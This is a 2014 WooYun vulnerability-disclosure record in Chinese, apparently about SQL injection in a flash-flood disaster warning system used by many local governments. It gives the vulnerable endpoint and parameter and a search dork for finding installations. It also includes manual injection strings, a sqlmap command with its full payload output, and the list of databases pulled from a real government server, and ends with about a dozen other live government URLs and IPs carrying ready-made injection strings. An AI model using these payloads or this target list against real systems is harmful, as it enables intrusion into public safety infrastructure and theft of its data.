{"id": 48473, "wybug_id": "wooyun-2014-077483", "wybug_title": "某通用型灾害预警系统SQL注入漏洞之一", "wybug_corp": "国家互联网应急中心", "wybug_author": "error", "wybug_date": "2014-09-27 20:24", "wybug_open_date": "2014-12-26 20:26", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "18", "wybug_status": "已交由第三方合作机构(cncert国家互联网应急中心)处理", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["安全意识不足", "注射"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-09-27：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-09-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-10-02：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-11-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-03：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-13：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-26：\t细节向公众公开  简要描述： 某通用型灾害预警系统存在SQL注入漏洞,影响众多地方政府的，可导致预警系统沦陷 详细说明：  福建四创软件开发的“山洪灾害预警监测系统”存在SQL注入漏洞，可获取数据库任意数据，进而而导致预警系统沦陷。官网：http://www.strongsoft.net/谷歌搜索： intitle:预警 系统 技术支持:福建四创\n\n注入链接：/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=注入参数：q   漏洞证明：  以http://shzh.wlfx.gov.cn/作为测试案例测试链接：http://shzh.wlfx.gov.cn/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=\n\n1)手工测试http://shzh.wlfx.gov.cn/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=aaaaaaaaaaaa'+or+'%'='\n\n报错注入：http://shzh.wlfx.gov.cn/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=aaaaa'%20and%201=@@version--\n\n2)sqlmap注入测试$ py sqlmap.py -u http://shzh.wlfx.gov.cn/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=  --dbms mssql --level 5 --risk 3 --dbs -v 0---Place: GETParameter: q    Type: boolean-based blind    Title: AND boolean-based blind - WHERE or HAVING clause    Payload: q=' AND 6991=6991 AND 'xGbU' LIKE 'xGbU    Type: error-based    Title: Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause    Payload: q=' AND 1735=CONVERT(INT,(SELECT CHAR(113)+CHAR(109)+CHAR(121)+CHAR(107)+CHAR(113)+(SELECT (CASE WHEN (1735=1735) THEN CHAR(49) ELSE CHAR(4    Type: UNION query    Title: Generic UNION query (NULL) - 13 columns    Payload: q=' UNION ALL SELECT NULL,CHAR(113)+CHAR(109)+CHAR(121)+CHAR(107)+CHAR(113)+CHAR(121)+CHAR(113)+CHAR(70)+CHAR(69)+CHAR(84)+CHAR(81)+CHAR(11    Type: stacked queries    Title: Microsoft SQL Server/Sybase stacked queries    Payload: q='; WAITFOR DELAY '0:0:5'--    Type: AND/OR time-based blind    Title: Microsoft SQL Server/Sybase time-based blind    Payload: q=' WAITFOR DELAY '0:0:5'-----web server operating system: Windows 2008 or Vistaweb application technology: ASP.NET, Microsoft IIS 7.0back-end DBMS: Microsoft SQL Server 2008available databases [15]:[*] AhadDataImage[*] AHADDATE[*] gq_center[*] gq_tmp[*] IStrongCMS_ZJWLFX[*] master[*] model[*] msdb[*] SoftDB_StrongExt_WLPC[*] strongmain[*] StrongWater[*] tempdb[*] wenlingslj[*] wenlingSoftdb[*] wlfxbtest1\n\n\n\n其他案例：http://218.86.96.98:3505/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=aaaaa'+and+1=@@version-- \n\nhttp://shzh.wlfx.gov.cn/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=aaaaa'+and+1=@@version-- \n\nhttp://shzh.dqwater.gov.cn/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=aaaaa'+and+1=@@version--\n\n http://218.86.6.48:3505/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=aaaaa'+and+1=@@version-- \n\nhttp://yj.yywater.gov.cn/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=aaaaa'+and+1=@@version-- \n\nhttp://222.216.218.28:8088/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=http://219.159.102.99:8088/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=http://111.12.51.221:8088/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=http://183.233.205.85:9001/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=http://222.83.214.58:8088/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=http://180.130.175.138:3503/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=http://219.159.239.96:8088/Duty/AjaxHandle/Jquery.autocomplete/AutocompleteContactByName.ashx?q=   修复方案：  过滤   版权声明：转载请注明来源 error@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-09-29 13:47 厂商回复：   最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-09-27 20:28 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  看楼主打出#1这样的标题，目测是准备开刷好多个了！    \n     2014-10-09 19:01 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  楼主一洞两投吗    \n     2014-10-09 19:24 |    \t\terror \t\t\t( 普通白帽子  |\t\t\t        Rank:415 漏洞数:96        )\t\t \n  @贫道来自河北 木有，这个在数字那边被其他人先投了    \n     2014-10-09 20:42 |    \t\t贫道来自河北 \t\t\t( 普通白帽子  |\t\t\t        Rank:1395 漏洞数:423        | 一个立志要把乌云集市变成零食店的男人)\t\t \n  @error 原来如此啊    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}